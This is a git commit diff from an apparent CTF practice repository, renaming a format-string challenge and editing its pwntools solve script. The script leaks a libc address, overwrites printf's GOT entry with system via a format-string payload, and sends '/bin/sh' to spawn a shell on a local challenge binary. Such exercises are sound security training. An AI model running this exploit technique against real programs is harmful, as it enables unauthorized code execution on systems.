91685148acd1f35f86445812af81f6eca69587f9
dmur1 <93072266+dmur1@users.noreply.github.com>
2025-02-14 17:35:26 +0000

    rename fmt_str_got_overwrite => fmt_str_got_overwrite_fgets

--- pwn/fmt_str/fmt_str_got_overwrite_fgets/challenge/go.py
+++ pwn/fmt_str/fmt_str_got_overwrite_fgets/challenge/go.py
@@ -8,13 +8,14 @@ context.binary = elf
 
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
 
-#p = elf.process()
+p = elf.process()
 #p = elf.debug(gdbscript="")
-p = remote("127.0.0.1", 9001)
+#p = remote("127.0.0.1", 9001)
 
 leak = int(p.readline().decode(), 16)
 libc.address = leak - libc.sym["setbuf"]
 
+# fgets - unlike read - cares about '\n' so make sure we exclude this
 p.sendline(fmtstr_payload(8, {elf.got["printf"]: libc.sym["system"]}, badbytes=b'\n'))
 
 p.sendline(b"/bin/sh")
